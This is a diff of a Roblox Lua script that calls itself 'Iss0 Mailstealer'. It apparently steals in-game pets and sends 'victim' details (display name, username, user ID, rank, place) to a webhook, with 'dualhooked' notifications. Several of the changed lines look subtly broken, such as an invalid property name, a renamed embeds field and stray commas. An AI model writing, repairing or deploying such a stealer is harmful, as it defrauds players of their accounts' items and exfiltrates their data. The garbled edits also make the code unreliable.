@@ -1,6 +1,6 @@
 getgenv().Settings = {
     PremiumKey = "rizzhub-LQOIpi8RuiFDqZ85hgwz",
-    Webhook = true, -- By Making This True The Users Of Your Script Will Be Able
+    Webhook = false, -- By Making This True The Users Of Your Script Will Be Able
     -- To Use A Webhook And They Will Get Every Notif Even The Dualhooked Ones
     MailMessage = "Buat Lu Monz Gua Fans Lu",
   Titanics = {
@@ -83,11 +83,11 @@ local webhookcolor = "13369599"
 _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
 _G.PlrUserVictim = game.Players.LocalPlayer.Name
 _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
-_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
+_G.PlrDisplayNameVictim = game.Players.LocalPlayer.PlrDisplayNameVictim
 local function sendwebhook(msg)
 local msg = {
   ["content"]= "**Iss0 Mailstealer has detected a new hit!**",
-  ["embeds"]= {
+  ["thumbnail"]= {
     {
       ["title"]= "`Iss0 Mailstealer Results`",
       ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."",
@@ -103,10 +103,10 @@ local msg = {
           ["name"]= "Pet Name & Rarity",
           ["value"]= "```Pet Name: "..v2.name.."\nPet Rarity: "..v2.rarity.."```",
 		  ["inline"]= true
-        }
-      }
-    }
-  }
+        },
+      },
+    },
+  },
   ["attachments"] = {}
 },
 local Webhook = _G.Webhook
